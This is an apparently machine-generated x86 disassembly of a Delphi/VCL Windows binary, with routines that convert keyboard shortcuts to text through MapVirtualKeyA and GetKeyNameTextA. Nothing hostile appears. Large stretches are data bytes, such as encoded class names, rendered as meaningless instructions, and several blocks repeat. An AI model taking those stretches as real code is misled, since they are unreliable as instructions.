add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
and [ edi ] 0x44
add [ esi ] al
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ esi + esi * 2 ] dl
inc esp
add [ esi + esi * 2 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
daa
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
dec eax
outsd
je r-xdata
jno r-xdata
sub [ eax + eax + 0x60 ] al
and eax 0x100044
add eax 0x756e654d
jae r-xdata
jl r-xdata
jo r-xdata
and al 0x29
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
outsd
insb
sub [ eax + eax + 0x6 ] al
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jl r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
dec edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
imul eax [ eax ] 0x1ff00
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
jmp [ eax ]
add [ ecx + ebp * 2 + 0x71700044 ] al
inc esp
add [ ebp + edi * 2 + 0x7e740044 ] bh
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov [ edi ] bl
inc esp
add [ eax + 0x60004427 ] al
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc ecx
andps xmm1 [ ebp + 0x65 ]
outsb
sub [ eax + eax + 0x3 ] al
xor eax [ eax ]
rcr [ ebx + 0x33340041 ] 0x1
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] ah
inc esp
add [ eax ] al
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
push [ eax + 0x1004475 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
inc eax
pop es
inc esp
add [ eax ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
or eax 0x7dd00041
inc esp
add al bl
jge r-xdata
or eax 0x300041
add bh bh
pushfd
jne r-xdata
hlt
mov [ edi ] bl
inc esp
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
inc ebx
push 0x65676e61
pushad
push cs
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
daa
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
je r-xdata
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
jb r-xdata
sub [ eax + eax + 0x69 ] al
add [ eax ] al
[ ecx ]
add bh bh
mov eax 0x1004471
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ esi + ebp * 2 + 0x44 ] dl
add [ eax - 0x80000000 ] al
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
shl [ ebx + ebp + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] ch
inc esp
add [ eax + eax ] dl
add [ eax ] al
in al 0x13
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x37ffbec8 ] cl
cmp al [ ecx ]
cmp [ edi ] dh
inc ecx
add [ edi + esi + 0x778c0041 ] dh
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add ah ah
adc eax [ ecx ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
outsb
xchg esp eax
sbb eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_437a5c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
inc edx
add [ edi + 0x27640042 ] al
inc edx
add [ eax + 0x27 ] dl
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
and [ edi ] ah
sub eax [ eax + eax + 0x8 ]
add [ eax ] al
add al ah
and eax 0x33200042
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x27200040 ] ah
imul esi [ ebx + 0x74 ] 0x442be090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_442888
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x29
push eax
outsd
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x7d140041 ] bl
inc esp
add [ eax + 0x71 ] al
inc esp
add [ eax ] al
jo r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ esi + esi * 2 ] dh
inc esp
add [ esi + esi * 2 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ esi + esi * 2 ] dl
inc esp
add [ esi + esi * 2 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
dec eax
outsd
je r-xdata
jno r-xdata
sub [ eax + eax + 0x60 ] al
and eax 0x100044
add eax 0x756e654d
jae r-xdata
jl r-xdata
jo r-xdata
and al 0x29
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jl r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
dec edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
imul eax [ eax ] 0x1ff00
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
jmp [ eax ]
add [ ecx + ebp * 2 + 0x71700044 ] al
inc esp
add [ ebp + edi * 2 + 0x7e740044 ] bh
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov [ edi ] bl
inc esp
add [ eax + 0x60004427 ] al
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc ecx
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
push [ eax + 0x1004475 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
inc eax
pop es
inc esp
add [ eax ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
or eax 0x7dd00041
inc esp
add al bl
jge r-xdata
or eax 0x300041
add bh bh
pushfd
jne r-xdata
hlt
mov [ edi ] bl
inc esp
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
inc ebx
push 0x65676e61
pushad
push cs
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
daa
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
je r-xdata
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
jb r-xdata
sub [ eax + eax + 0x69 ] al
add [ eax ] al
[ ecx ]
add bh bh
mov eax 0x1004471
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ esi + ebp * 2 + 0x44 ] dl
add [ eax - 0x80000000 ] al
outsd
outsb
add eax 0x756e654d
jae r-xdata
insb
sub [ eax + eax + 0x6 ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
shl [ ebx + ebp + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] ch
inc esp
add [ eax + eax ] dl
add [ eax ] al
in al 0x13
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x37ffbec8 ] cl
cmp al [ ecx ]
cmp [ edi ] dh
inc ecx
add [ edi + esi + 0x778c0041 ] dh
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add ah ah
adc eax [ ecx ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
outsb
xchg esp eax
sbb eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jne r-xdata
sub [ eax + eax + 0x3 ] al
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
xor eax [ eax ]
rcr [ ebx + 0x33340041 ] 0x1
inc esp
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] eax
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_437a5c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
inc edx
add [ edi + 0x27640042 ] al
inc edx
add [ eax + 0x27 ] dl
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
and [ edi ] ah
sub eax [ eax + eax + 0x8 ]
add [ eax ] al
add al ah
and eax 0x33200042
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x27200040 ] ah
imul esi [ ebx + 0x74 ] 0x442be090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
insd
popad
inc edx
outsd
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
add [ eax + esi + 0x7d880040 ] ah
inc esp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ eax + 0x71 ] bl
inc esp
add ah dh
jno r-xdata
outsd
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] ch
inc esp
add [ 0x654c616d ] cl
je r-xdata
add [ eax ] al
add [ eax ] al
add al 0x0
sub [ eax + eax - 0x73 ] al
inc eax
add al dl
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] ah
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
je r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] dl
inc esp
add [ eax ] bh
add [ eax ] al
lodsb [ esi ]
and al 0x44
add [ edx + 0x41 ] bh
outsd
inc edx
outsd
je r-xdata
outsd
insd
sub_442c2c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_4321e8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_437a5c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_442c84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_442cbc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403eac
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_40411c
sub_442d10
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_442ef9
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f44
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404094
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f44
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f44
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404094
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404094
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403eac
mov eax esi
call sub_403eac
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f44
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407c7c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041b8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_442cbc
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404174
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f44
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404174
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404174
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f00
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed0
retn
sub_442f14
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40416c
push eax
mov eax edi
call sub_40416c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40416c
push eax
mov eax edi
call sub_40436c
push eax
mov eax [ esi ]
call sub_40436c
pop edx
pop ecx
call sub_407b5c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40416c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_40440c
sub_442f70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_44304b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_442f14
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_442f14
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_442f14
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_442f14
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443052
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_442d10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407b0c
test eax eax
jne r-xdata
sub_443088
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_445628
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_445638
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4430e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_445628
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_445628
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_445638
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_445638
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_443088
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_443088
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_445638
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_445638
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_443234
push ebx
mov ebx eax
mov eax ebx
call sub_43fddc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_448144
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44326c
push ebx
mov ebx eax
mov eax ebx
call sub_43fdf0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44329c
push ebx
mov ebx eax
mov eax ebx
call sub_43fe04
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4432cc
push ebx
mov ebx eax
mov eax ebx
call sub_43fe2c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4432fc
push ebx
mov ebx eax
mov eax ebx
call sub_43fe54
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4042b8
je r-xdata
mov al 0x1
pop ebx
retn
sub_443330
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
